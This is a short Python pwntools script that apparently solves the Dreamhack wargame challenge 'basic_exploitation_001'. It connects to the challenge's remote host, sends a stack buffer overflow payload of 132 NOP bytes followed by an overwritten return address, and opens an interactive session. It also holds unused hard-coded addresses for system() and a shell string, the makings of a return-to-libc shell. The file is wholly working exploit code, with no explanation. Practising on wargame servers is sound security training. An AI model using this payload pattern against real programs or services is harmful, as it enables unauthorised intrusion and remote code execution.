#!/usr/bin/python

import pwn

pwn.context.log_level = 'debug'
#p = pwn.process("./basic_exploitation_001")
p = pwn.remote("host1.dreamhack.games", 11936)

nop = "\x90"
flag = "\xb9\x85\x04\x08"
sys = "\x30\x78\xe0\xf7"
sh = "\x52\x43\xf5\xf7"

payload = nop*132+flag

#print(payload)

p.send(payload)
p.interactive()
